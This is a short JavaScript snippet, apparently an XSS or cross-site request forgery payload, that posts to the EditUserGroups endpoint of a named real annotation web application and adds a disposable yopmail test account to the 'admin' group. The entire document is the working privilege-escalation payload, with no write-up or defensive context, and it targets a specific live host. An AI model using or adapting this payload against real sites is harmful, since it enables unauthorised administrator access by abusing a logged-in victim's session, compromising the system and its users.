var xhr = new XMLHttpRequest();

// Specify the details of the request
xhr.open("POST", "https://annotator.bii.a-star.edu.sg/annie/EditUserGroups.do", true);  // Asynchronous request

// Construct the FormData object
var formData = new FormData();
formData.append("urnparam", "bio:user:ywhtestastarxss1@yopmail.com");
formData.append("selectedGroups", "bio:group:admin");
formData.append("addToGroup", "<<<");

// Set the onload callback function
xhr.onload = function() {
  if (xhr.status === 200) {
    console.log("Request successful:", xhr.responseText);
  } else {
    console.error("Request failed:", xhr.status, xhr.statusText);
  }
};

// Send the request with the FormData payload
xhr.send(formData);
